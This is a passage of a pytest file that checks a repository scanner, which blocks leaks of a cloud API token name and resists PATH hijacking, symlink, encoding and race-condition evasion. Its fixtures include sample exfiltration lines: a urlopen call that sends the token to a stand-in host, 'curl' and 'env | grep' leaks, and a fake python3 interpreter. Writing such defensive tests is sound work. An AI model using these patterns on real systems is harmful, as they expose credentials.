    def spy(key: str, default: Any = None) -> Any:
        reads.append(key)
        return real_get(key, default)

    monkeypatch.setattr(check.os.environ, "get", spy)
    assert check.read_token() is None
    assert reads == []
    monkeypatch.setattr(check, "_isolated", lambda: True)
    assert check.read_token() == "secret"


def test_the_entry_point_has_no_shebang_and_no_executable_bit() -> None:
    assert not CHECKER.read_bytes().startswith(b"#!")
    assert not CHECKER.stat().st_mode & 0o111
    assert check.entry_point_problems(REPO) == []


def test_direct_execution_never_reaches_an_attacker_python3(tmp_path: Path) -> None:
    fake = tmp_path / "bin"
    fake.mkdir()
    marker = tmp_path / "stolen"
    py = fake / "python3"
    py.write_text(f"#!/bin/sh\ntouch {marker}\n")
    py.chmod(0o755)
    env = {"PATH": f"{fake}:/usr/bin:/bin", NAME: "secret"}
    with pytest.raises(PermissionError):
        subprocess.run([str(CHECKER), "--offline"], env=env, cwd=tmp_path)  # noqa: S603
    assert not marker.exists()


def test_the_offline_check_rejects_a_shebang_or_an_executable_entry_point(
    root: Path,
) -> None:
    script = root / "scripts" / "check-edge.py"
    script.parent.mkdir()
    script.write_text("#!/usr/bin/env -S python3 -I\n")
    script.chmod(0o755)
    problems = check.entry_point_problems(root)
    assert any("executable" in p for p in problems), problems
    assert any("shebang" in p for p in problems), problems


def scan(root: Path, rel: str, data: bytes) -> list[str]:
    path = root / rel
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_bytes(data)
    return [p for p in check.repo_handoff_problems(root) if rel in p]


@pytest.mark.parametrize(
    ("rel", "data"),
    [
        ("pkg/node_modules/x.py", f"x = {NAME}\n".encode()),  # skipped dir, nested
        ("pkg/venv/run", f"echo {NAME}\n".encode()),
        ("a/b/thing.weird", f"{NAME}\n".encode()),  # unusual suffix
        ("Makefile", f"leak:\n\tenv | grep {NAME}\n".encode()),  # no suffix, no shebang
        ("blob.bin", b"\xff\xfe\x00" + NAME.encode() + b"\xff"),  # not UTF-8
        ("big.py", b"A" * 3_000_000 + NAME.encode()),  # past any old size limit
    ],
)
def test_the_handoff_scan_has_no_suffix_depth_or_size_evasion(
    root: Path, rel: str, data: bytes
) -> None:
    assert scan(root, rel, data), rel


def test_the_handoff_scan_finds_a_name_split_across_read_chunks(
    root: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.setattr(check, "SCAN_CHUNK", 7)
    assert scan(root, "odd/file", b"A" * 5 + NAME.encode() + b"B")


def test_the_handoff_scan_follows_a_symlink_to_a_document(root: Path) -> None:
    (root / "docs").mkdir()
    (root / "docs" / "edge.md").write_text(f"echo {NAME}\n")
    (root / "bin").mkdir()
    (root / "bin" / "run").symlink_to(root / "docs" / "edge.md")
    assert [p for p in check.repo_handoff_problems(root) if "bin/run" in p]
    assert not [p for p in check.repo_handoff_problems(root) if "edge.md:" in p]


def test_the_handoff_scan_refuses_a_symlink_it_cannot_scan(
    root: Path, tmp_path_factory: pytest.TempPathFactory
) -> None:
    outside = tmp_path_factory.mktemp("outside") / "f"
    outside.write_text("x")
    (root / "out").symlink_to(outside)
    (root / "dangling").symlink_to(root / "missing")
    problems = check.repo_handoff_problems(root)
    assert any(p.startswith("out:") for p in problems)
    assert any(p.startswith("dangling:") for p in problems)


def test_the_handoff_scan_skips_ignored_directories_only_at_the_root(
    root: Path,
) -> None:
    assert not scan(root, "node_modules/x.py", f"{NAME}\n".encode())
    assert not scan(root, "docs/edge.md", f"{NAME}\n".encode())
    assert scan(root, "scripts/__pycache__/x.pyc", NAME.encode())
    assert scan(root, "lib/payload.pyo", NAME.encode())
    assert scan(root, "payload.pyc", NAME.encode("utf-16-le"))
    # no path or name is exempt, the checker's own cache name included
    assert scan(root, "scripts/__pycache__/check-edge.fake.pyc", NAME.encode())
    assert scan(root, "scripts/__pycache__/check-edge.cpython-312.pyc", NAME.encode())
    assert scan(root, "tests/__pycache__/check-edge.cpython-312.pyc", NAME.encode())


def test_loading_the_checker_writes_no_cache_of_it(tmp_path: Path) -> None:
    scripts = tmp_path / "scripts"
    scripts.mkdir()
    copy = scripts / "check-edge.py"
    copy.write_bytes(CHECKER.read_bytes())
    load(copy, "check_edge_copy")
    assert not (scripts / "__pycache__").exists()


def test_a_computed_name_is_outside_the_documented_scan_limit(root: Path) -> None:
    """Pins the documented limit: only the literal name (UTF-8/16/32) is found."""
    split = 'import os\nn = "CLOUDFLARE_EDGE_" + "READ_TOKEN"\nos.environ[n]\n'
    assert scan(root, "computed.py", split.encode()) == []
    doc = " ".join((REPO / "docs" / "edge.md").read_text("utf-8").split())
    assert "A name built at run time" in doc


def test_the_real_test_file_passes_its_own_narrow_exemption() -> None:
    assert check.fixture_file_problem(Path(__file__)) is None
    assert check.repo_handoff_problems(REPO) == []


@pytest.mark.parametrize(
    "body",
    [
        f"import os\nos.environ[{NAME!r}]\n",
        f"import os\nos.getenv({NAME!r})\n",
        f"urlopen('https://x.invalid/?' + os.environ[{NAME!r}])\n",
        f"{NAME} = 1\n",
        f"x.{NAME}\n",
        "def broken(:\n",
    ],
)
def test_the_test_file_exemption_does_not_cover_real_use(root: Path, body: str) -> None:
    problems = scan(root, check.TOKEN_TEST_FILE, body.encode())
    assert problems, body


def test_a_failed_temp_cleanup_after_install_is_not_a_failed_save(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    target = tmp_path / "snap.json"

    def denied(path: Any) -> None:
        raise OSError(13, "cleanup denied")

    real_unlink = check.os.unlink
    monkeypatch.setattr(check.os, "unlink", denied)
    leftover = check.write_new_file(target, '{"a": 1}')
    monkeypatch.setattr(check.os, "unlink", real_unlink)
    assert target.read_text() == '{"a": 1}'
    assert leftover is not None and Path(leftover).name.startswith(".snapshot-")
    # the retry is refused cleanly because the snapshot is already there
    with pytest.raises(FileExistsError):
        check.write_new_file(target, "other")


def test_live_reports_a_leftover_temp_name_as_a_warning_not_a_failure(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    capsys: pytest.CaptureFixture[str],
) -> None:
    monkeypatch.setenv(NAME, SENTINEL)
    monkeypatch.setattr(check, "offline_problems", lambda root: [])
    monkeypatch.setattr(check, "write_new_file", lambda p, t: "/x/.snapshot-abc")
    desired = check.load_desired()

    def api(path: str, token: str) -> dict[str, Any]:
        return {"rules": []} if "rulesets" in path else dict(desired["bot_management"])

    monkeypatch.setattr(check, "api_result", api)
    check.main(["--live", "--zone-id", "0" * 32, "--save", str(tmp_path / "s.json")])
    err = capsys.readouterr().err
    assert "snapshot saved" in err and SENTINEL not in err
    assert "cannot save" not in err


def test_the_snapshot_directory_is_synced_after_the_link(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    synced: list[int] = []
    real = check.os.fsync

    def recording(fd: int) -> None:
        synced.append(fd)
        real(fd)

    monkeypatch.setattr(check.os, "fsync", recording)
    check.write_new_file(tmp_path / "s.json", "{}")
    assert len(synced) == 2  # the file, then its directory


# --- round 7: no PATH handoff, special files, races, docs, computed names -----


def test_a_fifo_is_reported_and_never_opened(root: Path) -> None:
    import os
    import threading

    os.mkfifo(root / "scan-hang")
    box: list[list[str]] = []
    worker = threading.Thread(
        target=lambda: box.append(check.repo_handoff_problems(root)), daemon=True
    )
    worker.start()
    worker.join(10)
    assert not worker.is_alive(), "the scan blocked on a FIFO"
    assert any(p.startswith("scan-hang:") and "regular" in p for p in box[0])


def test_a_symlink_to_a_fifo_is_reported_and_never_opened(root: Path) -> None:
    import os
    import threading

    os.mkfifo(root / "pipe")
    (root / "link").symlink_to(root / "pipe")
    box: list[list[str]] = []
    worker = threading.Thread(
        target=lambda: box.append(check.repo_handoff_problems(root)), daemon=True
    )
    worker.start()
    worker.join(10)
    assert not worker.is_alive()
    assert any(p.startswith("link:") and "regular" in p for p in box[0])


def test_a_directory_symlink_is_reported(
    root: Path, tmp_path_factory: pytest.TempPathFactory
) -> None:
    outside = tmp_path_factory.mktemp("outside-tree")
    (outside / "leak.py").write_text(f"{NAME}\n")
    (root / "repo-link").symlink_to(outside, target_is_directory=True)
    inside = root / "real"
    inside.mkdir()
    (root / "inside-link").symlink_to(inside, target_is_directory=True)
    problems = check.repo_handoff_problems(root)
    assert any(
        p.startswith("repo-link:") and "directory symlink" in p for p in problems
    )
    assert any(p.startswith("inside-link:") for p in problems)


def test_a_file_replaced_during_its_own_scan_is_reported(
    root: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    target = root / "late.py"
    target.write_text("x = 1\n")
    other = root / "other.py"
    other.write_text(f"print({NAME!r})\n")
    real = check.os.lstat
    calls: list[int] = []

    def swapping(path: Any, *a: Any, **k: Any) -> Any:
        if Path(path) == target:
            calls.append(1)
            if len(calls) == 2:  # the check after the read
                check.os.replace(other, target)
        return real(path, *a, **k)

    monkeypatch.setattr(check.os, "lstat", swapping)
    assert check._names_token(target) is None


def test_an_in_place_write_with_restored_times_is_reported(
    root: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    import os

    target = root / "inplace.py"
    target.write_bytes(b"A" * 40)
    before = os.stat(target)
    real = check.os.lstat
    calls: list[int] = []

    def writing(path: Any, *a: Any, **k: Any) -> Any:
        if Path(path) == target:
            calls.append(1)
            if len(calls) == 2:  # the check after the read
                with open(target, "r+b") as handle:  # same inode, same size
                    handle.write(NAME.encode()[:40])
                os.utime(target, ns=(before.st_atime_ns, before.st_mtime_ns))
        return real(path, *a, **k)

    monkeypatch.setattr(check, "SCAN_CHUNK", 8)
    monkeypatch.setattr(check.os, "lstat", writing)
    assert check._names_token(target) is None


def test_a_new_hardlink_during_the_scan_is_reported(
    root: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    import os

    target = root / "linked.py"
    target.write_text("x = 1\n")
    real = check.os.lstat
    calls: list[int] = []

    def linking(path: Any, *a: Any, **k: Any) -> Any:
        if Path(path) == target:
            calls.append(1)
            if len(calls) == 2:
                os.link(target, root / "alias.py")
        return real(path, *a, **k)

    monkeypatch.setattr(check.os, "lstat", linking)
    assert check._names_token(target) is None


def test_the_file_identity_compares_the_link_count_on_its_own() -> None:
    from types import SimpleNamespace

    base = {
        "st_dev": 1,
        "st_ino": 2,
        "st_size": 3,
        "st_nlink": 1,
        "st_mtime_ns": 4,
        "st_ctime_ns": 5,
    }
    same = SimpleNamespace(**base)
    assert check._same_file(SimpleNamespace(**base), same)
    # Only st_nlink differs (ctime, mtime, size and inode equal): without the
    # link-count comparison this would read as the same file.
    assert not check._same_file(SimpleNamespace(**{**base, "st_nlink": 2}), same)


@pytest.mark.parametrize("enc", ["utf-16-le", "utf-16-be", "utf-32-le", "utf-32-be"])
def test_the_scan_finds_the_name_in_wide_encodings(root: Path, enc: str) -> None:
    data = ("$x = $env:" + NAME + "\n").encode(enc)
    assert scan(root, "leak.ps1", data), enc
    assert scan(root, "bom.txt", ("﻿" + NAME).encode(enc)), enc


def test_the_scan_finds_a_wide_name_split_across_read_chunks(
    root: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.setattr(check, "SCAN_CHUNK", 5)
    assert scan(root, "wide/f", b"xx" + NAME.encode("utf-16-le") + b"yy")
    assert scan(root, "wide/g", b"x" + NAME.encode("utf-32-be") + b"y")


def test_an_unreadable_directory_is_reported_not_treated_as_clean(
    root: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    import os

    hidden = root / "hidden"
    hidden.mkdir()
    (hidden / "leak").write_text(NAME)
    real = os.scandir

    def denying(path: Any = ".") -> Any:
        if Path(path) == hidden:
            raise PermissionError(13, "denied", str(hidden))
        return real(path)

    monkeypatch.setattr(check.os, "scandir", denying)
    problems = check.repo_handoff_problems(root)
    assert any(p.startswith("hidden:") and "cannot be listed" in p for p in problems)


def test_a_file_past_the_size_bound_is_reported_without_being_read(
    root: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.setattr(check, "MAX_SCAN_FILE_BYTES", 100)
    problems = scan(root, "huge.bin", b"A" * 300 + NAME.encode())
    assert problems and "too large" in problems[0]
    # The cap is injected and small, so a reverted cap reads a few KB and the
    # assertion below fails promptly; nothing here can run away.
    sparse = root / "sparse.bin"
    with open(sparse, "wb") as handle:
        handle.truncate(100_000)  # sparse: no disk used
    assert any(
        p.startswith("sparse.bin:") and "too large" in p
        for p in check.repo_handoff_problems(root)
    )


def test_a_file_that_grows_while_read_is_cut_off_at_the_bound(
    root: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    target = root / "grow.log"
    target.write_bytes(b"A" * 10)
    monkeypatch.setattr(check, "MAX_SCAN_FILE_BYTES", 50)

    class Endless:
        reads = 0

        def __enter__(self) -> Endless:
            return self

        def __exit__(self, *exc: Any) -> None:
            return None

        def read(self, size: int) -> bytes:
            # A file that keeps growing as it is read. Bounded for the test: if
            # the cap were reverted this fails after a few reads, never hangs.
            Endless.reads += 1
            if Endless.reads > 100:
                raise AssertionError("the byte bound was not enforced")
            return b"A" * 8

    monkeypatch.setattr(check.os, "fdopen", lambda *a, **k: Endless())
    with pytest.raises(check.ScanTooLarge):
        check._names_token(target)


def test_the_whole_scan_has_a_total_byte_bound(
    root: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.setattr(check, "MAX_SCAN_TOTAL_BYTES", 150)
    for i in range(5):
        (root / f"f{i}.txt").write_bytes(b"A" * 60)
    problems = check.repo_handoff_problems(root)
    assert any("total byte bound" in p for p in problems), problems


def test_a_path_that_is_a_symlink_at_open_time_is_not_followed(root: Path) -> None:
    (root / "real.py").write_text(f"{NAME}\n")
    (root / "swapped.py").symlink_to(root / "real.py")
    assert check._names_token(root / "swapped.py") is None


@pytest.mark.parametrize("rel", ["docs/payload.txt", "docs/notes.md", "README.md"])
def test_a_document_suffix_does_not_exempt_a_file(root: Path, rel: str) -> None:
    assert scan(root, rel, f"curl $X/{NAME}\n".encode()), rel


def test_only_the_reviewed_doc_path_may_name_the_token(root: Path) -> None:
    assert not scan(root, "docs/edge.md", f"{NAME}\n".encode())
    (root / "scripts").mkdir(exist_ok=True)
    (root / "scripts" / "leak").write_text("#!/bin/sh\n. ../docs/payload.txt\n")
    assert scan(root, "docs/payload.txt", f"echo {NAME}\n".encode())


@pytest.mark.parametrize(
    "body",
    [
        f"import os\nname = 'x{NAME}'.removeprefix('x')\nprint(os.environ[name])\n",
        f"import os\nprint(os.environ[getattr(m, 'KEY', '{NAME}')])\n",
        f"import os\nprint(os.environ[f'{NAME}'])\n",
        f"name = {NAME[:11]!r} + {NAME[11:]!r}\n",
        f"name = ''.join([{NAME[:11]!r}, {NAME[11:]!r}])\n",
        f"name = 'a' + '{NAME}'\n",
        f"print('{NAME}'[0:])\n",
        f"x = {{'{NAME}': 1}}\n",
    ],
)
def test_the_test_file_exemption_rejects_computed_use_of_the_name(
    root: Path, body: str
) -> None:
    assert scan(root, check.TOKEN_TEST_FILE, body.encode()), body


@pytest.mark.parametrize(
    "body",
    [
        f"import os\nos.environ[({NAME!r},)[0]]\n",
        f"import os\nos.environ[[{NAME!r}][0]]\n",
        f"import os\nos.environ.get(*({NAME!r},))\n",
        f"import os\nfor n in ({NAME!r},):\n    os.environ[n]\n",
        f"import os\nos.environ.get(*[{NAME!r}])\n",
        f"import os\nos.getenv(*({NAME!r},), None)\n",
        f"import os\nprint(list(({NAME!r},)))\nos.environ[{NAME!r}]\n",
        f"X = [({NAME!r}, 1)]\n",
        f"X = (['a', ({NAME!r},)],)\n",
        f"CASES = [('a', 'echo {NAME}'), 'b {NAME}']\n",
        f"CASES = [{NAME!r}]\n",
        f"CASES = ({NAME!r},)\n",
    ],
)
def test_the_test_file_may_not_hold_the_name_even_inside_a_list_or_tuple(
    root: Path, body: str
) -> None:
    assert scan(root, check.TOKEN_TEST_FILE, body.encode()), body
    assert check_file_problem(root, body) is not None, body


def check_file_problem(root: Path, body: str) -> str | None:
    path = root / "probe_test_file.py"
    path.write_text(body)
    problem: str | None = check.fixture_file_problem(path)
    return problem
